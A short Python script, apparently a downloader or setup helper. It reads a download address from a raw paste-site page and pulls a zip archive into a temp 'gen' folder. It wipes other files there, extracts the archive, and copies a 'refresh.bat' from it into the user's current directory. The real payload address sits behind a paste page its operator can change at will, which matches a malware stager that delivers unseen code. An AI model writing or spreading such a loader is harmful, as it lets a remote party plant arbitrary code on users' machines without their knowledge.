import os
import requests
import shutil
import zipfile
from tqdm import tqdm

current_dir = os.getcwd()
base_dir = os.getenv("TEMP")
gen_dir = os.path.join(base_dir, "gen")

if not os.path.exists(gen_dir):
    os.makedirs(gen_dir)

def get_download_link():
    response = requests.get("https://rlim.com/urll/raw")
    url = response.text.strip()
    if url.startswith("#"):  
        url = url.lstrip("#").strip()
    if url.startswith("<") and url.endswith(">"):
        url = url[1:-1]
    return url

def download_file(url, filename):
    response = requests.get(url, stream=True)
    if response.status_code != 200:
        raise Exception(f"Failed to download file: {response.status_code}")
    total_size = int(response.headers.get("content-length", 0))
    with open(filename, "wb") as file, tqdm(
        desc=filename,
        total=total_size,
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    ) as bar:
        for data in response.iter_content(chunk_size=1024):
            file.write(data)
            bar.update(len(data))

def clean_directory(exceptions):
    for item in os.listdir(gen_dir):
        if item not in exceptions:
            path = os.path.join(gen_dir, item)
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)

def extract_zip(zip_file):
    with zipfile.ZipFile(zip_file, "r") as zip_ref:
        zip_ref.extractall(gen_dir)

os.chdir(gen_dir)

zip_file = "plgg.zip"
if os.path.exists(zip_file):
    choice = input(f"{zip_file} already exists. Delete it? (y/n): ").strip().lower()
    if choice == "y":
        os.remove(zip_file)

download_url = get_download_link()
print(f"Downloading...")
download_file(download_url, zip_file)
clean_directory([zip_file, "setup.py"])
extract_zip(zip_file)
os.remove(zip_file)

refresh_bat_path = os.path.join(gen_dir, "refresh.bat")
if os.path.exists(refresh_bat_path):
    shutil.copy(refresh_bat_path, os.path.join(current_dir, "refresh.bat"))
else:
    print("refresh.bat not found in the 'gen' directory.")

setup_exe_path = os.path.join(gen_dir, "setup.exe")
if os.path.exists(setup_exe_path):
    os.remove(setup_exe_path)